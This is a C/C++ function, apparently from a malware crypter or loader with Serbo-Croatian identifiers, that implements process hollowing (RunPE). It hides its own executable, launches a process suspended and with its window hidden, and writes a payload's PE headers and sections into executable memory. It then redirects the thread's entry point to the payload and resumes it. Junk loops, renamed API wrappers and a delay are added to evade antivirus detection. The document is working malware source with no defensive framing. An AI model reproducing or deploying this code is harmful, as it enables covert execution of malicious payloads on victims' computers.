bool Izbaci(LPBYTE lpBuf)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION krele;
	CONTEXT ctx;
	PIMAGE_DOS_HEADER jabuka;
	PIMAGE_NT_HEADERS jabuka1;
	PIMAGE_SECTION_HEADER jabuka2;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
	ctx.ContextFlags = CONTEXT_FULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

	denis(320);

	GetModuleFileNameW(NULL, direkcija,MAX_PATH);


	if(PostojiW(direkcija))
	{
      SetFileAttributesW(direkcija, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM );
	}
	 //*********************************************

               if(Slama[strlen(Slama)-1] == 'D')
			   {
                    if(Slama[strlen(Slama)-2] == 'A')
					{
                      if(Slama[strlen(Slama)-3] == 'P')
					  {
                       Slama[strlen(Slama)-3] = '\0';
					  }
					}
			   }

    //*********************************************
	
	jabuka = (PIMAGE_DOS_HEADER)&lpBuf[0];
	if(jabuka->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return false;
	}

	 //*********************************************

              if(Slama[strlen(Slama)-1] == 'P')
			  {
                      Slama[strlen(Slama)-1] = '\0';
			  }

    //*********************************************

	jabuka1 = (PIMAGE_NT_HEADERS)&lpBuf[jabuka->e_lfanew];
	if(jabuka1->Signature != IMAGE_NT_SIGNATURE)
	{
		return false;
	}
	
	
	//*********************************************
       if(Slama[strlen(Slama)-1] == 'A')
	   {
           if(Slama[strlen(Slama)-2] == 'P')
		   {
                 Slama[strlen(Slama)-2] = '\0';
		   }
	   }


     //*********************************************
    if(Slama[0] == '1' & Slama[1] == 'p' & Slama[2] == 'i' & Slama[3] == 'k' & Slama[4] == 'e')
	{
              Slama = "";
	}

	for(int i = 0;i<strlen(Slama);i++)
	{

    if(Slama[i] == '+')
	{
     Slama[i] = '\0';

	}
 
	}


		int q = 50000;

                for(i = 0;i < q; i++)
				{
	                    	q = q + 1;
				}

	   int size = strlen(Slama);
       WCHAR * name;
       name = new WCHAR[size];
       mbstowcs(name, Slama, size);

	if (xProcesPokreni(direkcija, name, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &krele) == TRUE)
		//AddSubOne(rand(),3);
	     ////MessageBox(NULL,"1",NULL,NULL);
		 clean();
		MapaPuta(krele.hProcess, (PVOID)jabuka1->OptionalHeader.ImageBase);
	    	////MessageBox(NULL,"2",NULL,NULL);
		//AddSubOne(rand(),3);
	    xEXLociraj(krele.hProcess, (LPVOID)jabuka1->OptionalHeader.ImageBase, jabuka1->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        clean();
		//AddSubOne(rand(),89);
		 ////MessageBox(NULL,"3",NULL,NULL);
		
		if (xPisemMemoriju(krele.hProcess, (LPVOID)jabuka1->OptionalHeader.ImageBase, &lpBuf[0], jabuka1->OptionalHeader.SizeOfHeaders, NULL) == TRUE)
		   
			for(INT i = 0; i < jabuka1->FileHeader.NumberOfSections; i++)
			{
				 ////MessageBox(NULL,"4",NULL,NULL);
				clean();
				jabuka2 = (PIMAGE_SECTION_HEADER)&lpBuf[jabuka->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
                 ////MessageBox(NULL,"5",NULL,NULL);
			    //AddSubOne(32,rand());
                //clean();
				xPisemMemoriju(krele.hProcess, (LPVOID)(jabuka1->OptionalHeader.ImageBase + jabuka2->VirtualAddress), &lpBuf[jabuka2->PointerToRawData], jabuka2->SizeOfRawData, NULL);
			    ////MessageBox(NULL,"6",NULL,NULL);
			}
			if (xUzmiKontekst(krele.hThread, &ctx) == TRUE)
			{
				////MessageBox(NULL,"7",NULL,NULL);
				//AddSubOne(rand(),14);
				ctx.Eax = jabuka1->OptionalHeader.ImageBase + jabuka1->OptionalHeader.AddressOfEntryPoint;
				////MessageBox(NULL,"8",NULL,NULL);
				//AddSubOne(rand(),25);
                clean();
				xPodesiKontekst(krele.hThread, &ctx);
				////MessageBox(NULL,"9",NULL,NULL);
				//AddSubOne(7,rand());

                 for(i = 0;i < q; i++)
				{
	                    	q = q + 1;
				}

				xNastaviPut(krele.hThread);
				////MessageBox(NULL,"10",NULL,NULL);
				//clean();
				//AddSubOne(rand(),rand());
				}
             
	return true;
}